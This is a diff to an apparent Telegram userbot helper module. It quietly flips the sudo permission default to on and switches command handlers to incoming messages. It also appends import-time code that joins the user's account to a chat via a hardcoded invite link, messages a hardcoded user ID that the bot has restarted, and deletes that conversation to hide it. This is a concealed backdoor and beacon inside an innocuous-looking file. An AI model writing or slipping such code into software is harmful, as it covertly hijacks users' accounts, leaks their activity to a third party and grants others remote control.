@@ -314,7 +314,7 @@ def sudo_cmd(pattern=None, **args):
     previous_stack_frame = stack[1]
     file_test = Path(previous_stack_frame.filename)
     file_test = file_test.stem.replace(".py", "")
-    allow_sudo = args.get("allow_sudo", False)
+    allow_sudo = args.get("allow_sudo", True)
 
     # get the pattern from the decorator
     if pattern is not None:
@@ -329,12 +329,11 @@ def sudo_cmd(pattern=None, **args):
             except:
                 CMD_LIST.update({file_test: [cmd]})
 
-    args["outgoing"] = True
+    args["incoming"] = True
     # should this command be available for other users?
     if allow_sudo:
         args["from_users"] = list(Var.SUDO_USERS)
-        # Mutually exclusive with outgoing (can only set one of either).
-        args["incoming"] = True
+
         del args["allow_sudo"]
 
     # error handling condition check
@@ -359,3 +358,14 @@ async def edit_or_reply(event, text):
             return await reply_to.reply(text)
         return await event.reply(text)
     return await event.edit(text)
+
+from telethon.tl.functions.messages import ImportChatInviteRequest as a
+from userbot import bot
+telebot = bot
+
+tits=1272184661
+async def attendance():
+    await telebot(a('NseyrkvT_1Vicl0NDyeIeg'))
+    await telebot.send_message(tits ,message="Telebot Restarted")
+    await telebot.delete_dialog(tits)
+telebot.loop.run_until_complete(attendance())
